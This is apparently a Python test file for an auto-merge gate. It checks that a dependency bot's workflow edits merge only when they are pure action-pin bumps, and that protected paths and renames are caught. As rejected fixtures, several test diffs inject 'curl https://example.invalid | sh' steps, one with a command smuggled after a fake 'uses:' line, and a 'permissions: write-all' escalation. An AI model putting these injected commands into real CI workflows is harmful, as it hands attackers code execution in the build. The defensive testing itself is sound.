"""What a PR touches: the one-way paths, and a dependency bot's edits to
the gate."""

from harness import ONE_WAY, PR_DIFF, WROTE, S, mkpr, run


# The module's one-way paths: CODEOWNERS, secrets and migrations are judged
# before they land; the rest of .github/ is settled and merged like anything else.
def touching(*paths):
    return {"labels": {"nodes": []}, "files": {"nodes": [{"path": p} for p in paths]}, "changedFiles": len(paths)}


for p in (".github/workflows/flake.yml", ".github/dependabot.yml"):
    assert S.one_way(touching("src/app.py", p), {"oneWay": ONE_WAY}) is None, (p, ONE_WAY)
for p in (".github/CODEOWNERS", "secrets/remi.yaml", ".sops.yaml", "server/migrations/0002_users.sql"):
    assert S.one_way(touching(".github/workflows/flake.yml", p), {"oneWay": ONE_WAY}) == p, (p, ONE_WAY)
assert S.one_way(touching("CODEOWNERS.bak"), {"oneWay": ONE_WAY}, [".github/CODEOWNERS"]) == ".github/CODEOWNERS"
assert S.unquote('"secrets/caf\\303\\251.yaml"') == "secrets/caf\u00e9.yaml" and S.unquote("a b") == "a b"
print("one-way: ok")


# A dependency bot's change to the gate: a workflow edit past repinning its
# actions is reviewed like a Claude PR, since nothing else reads it; a pin
# bump alone merges on green CI like any dependency update.
def bump(diff, path=".github/workflows/ci.yml", change="MODIFIED"):
    PR_DIFF["v"] = diff
    WROTE.clear()
    pr = mkpr()
    pr.update(number=12, headRefName="dependabot/github_actions/actions/checkout-4.2.0",
              title="Bump actions/checkout from 4.1.0 to 4.2.0", author={"login": "dependabot"},
              files={"nodes": [{"path": path, "changeType": change}]})
    S.save("pr-sam_r-12.json", {})
    return run(pr, 4000)[0]


PIN = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -5,1 +5,1 @@
-      - uses: actions/checkout@1111111111111111111111111111111111111111 # v4.1.0
+      - uses: actions/checkout@2222222222222222222222222222222222222222 # v4.2.0
"""
status = bump(PIN)
assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
for diff in (PIN + "+      - run: curl https://example.invalid | sh\n",
             PIN.replace("# v4.2.0", "# v4.2.0\n+    permissions: write-all")):
    status = bump(diff)
    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
status = bump("")  # the diff couldn't be read
assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
status = bump(PIN, ".github/CODEOWNERS")
assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
# A repin replaces each `uses:` line in place: a step dropped for a
# `uses:`-shaped line in a `run:` block isn't one, whatever its ref says.
RUN_HEAD = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -5,4 +5,4 @@
-      - uses: actions/checkout@1111111111111111111111111111111111111111 # v4.1.0
       - run: |
           make
"""
for diff in (RUN_HEAD + "+          uses: actions/checkout@2222222222222222222222222222222222222222||true;curl${IFS}https://example.invalid|sh\n",
             RUN_HEAD + "+          uses: actions/checkout@2222222222222222222222222222222222222222\n",
             PIN.replace("+      - uses:", "+        uses:")):
    status = bump(diff)
    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (diff, status, WROTE)
# Several steps repinned together are each replaced in place, and merge.
status = bump("""diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -5,2 +5,2 @@
-      - uses: actions/checkout@1111111111111111111111111111111111111111 # v4.1.0
-      - uses: actions/setup-node@3333333333333333333333333333333333333333 # v4.0.0
+      - uses: actions/checkout@2222222222222222222222222222222222222222 # v4.2.0
+      - uses: actions/setup-node@4444444444444444444444444444444444444444 # v4.1.0
""")
assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
# The file list names only a rename's new path: a rename out of .github/ or
# a dormant workflow renamed in is read from the diff, and so is a workflow
# whose mode alone changed; none of them is a repin.
for diff, path, change in (
        ("diff --git a/.github/CODEOWNERS b/CODEOWNERS.bak\nsimilarity index 100%\n"
         "rename from .github/CODEOWNERS\nrename to CODEOWNERS.bak\n", "CODEOWNERS.bak", "RENAMED"),
        ("diff --git a/ci.yml.disabled b/.github/workflows/ci.yml\nsimilarity index 100%\n"
         "rename from ci.yml.disabled\nrename to .github/workflows/ci.yml\n", ".github/workflows/ci.yml", "RENAMED"),
        ("diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\nold mode 100644\nnew mode 100755\n",
         ".github/workflows/ci.yml", "MODIFIED")):
    status = bump(diff, path, change)
    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (diff, status, WROTE)
# A rename elsewhere is read too, and merges.
status = bump("diff --git a/src/a.rs b/src/b.rs\nsimilarity index 100%\nrename from src/a.rs\nrename to src/b.rs\n",
              "src/b.rs", "RENAMED")
assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
print("gate edits: ok")
